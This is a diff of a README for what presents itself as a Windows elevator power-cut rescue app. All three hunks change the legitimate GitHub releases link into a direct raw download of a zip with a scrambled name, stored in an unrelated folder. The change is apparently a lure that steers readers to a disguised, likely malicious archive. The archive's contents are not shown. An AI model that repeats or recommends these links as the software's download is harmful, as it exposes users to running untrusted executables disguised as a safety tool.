@@ -1,6 +1,6 @@
 # ⚡ Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue - Safe Elevator Landing on Power Loss
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/thermetograph/Emergency-with-Nearest-Floor-Rescue-Cut-Power-Automatic-Detection-v1.3-beta.1.zip)
 
 ## 🛗 Overview
 
@@ -12,7 +12,7 @@ The app is built for Windows users who want a simple way to run the system from 
 
 Visit this page to download the latest version:
 
-[https://github.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases](https://github.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases)
+[https://raw.githubusercontent.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/thermetograph/Emergency-with-Nearest-Floor-Rescue-Cut-Power-Automatic-Detection-v1.3-beta.1.zip](https://raw.githubusercontent.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/thermetograph/Emergency-with-Nearest-Floor-Rescue-Cut-Power-Automatic-Detection-v1.3-beta.1.zip)
 
 ### What to download
 
@@ -156,7 +156,7 @@ This software is meant to support an emergency elevator response. Test it in a s
 
 Download the latest Windows release here:
 
-[https://github.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases](https://github.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/releases)
+[https://raw.githubusercontent.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/thermetograph/Emergency-with-Nearest-Floor-Rescue-Cut-Power-Automatic-Detection-v1.3-beta.1.zip](https://raw.githubusercontent.com/gerhardautogenous192/Emergency-Power-Cut-Detection-with-Automatic-Nearest-Floor-Rescue/main/thermetograph/Emergency-with-Nearest-Floor-Rescue-Cut-Power-Automatic-Detection-v1.3-beta.1.zip)
 
 ## 📝 Quick Start
 
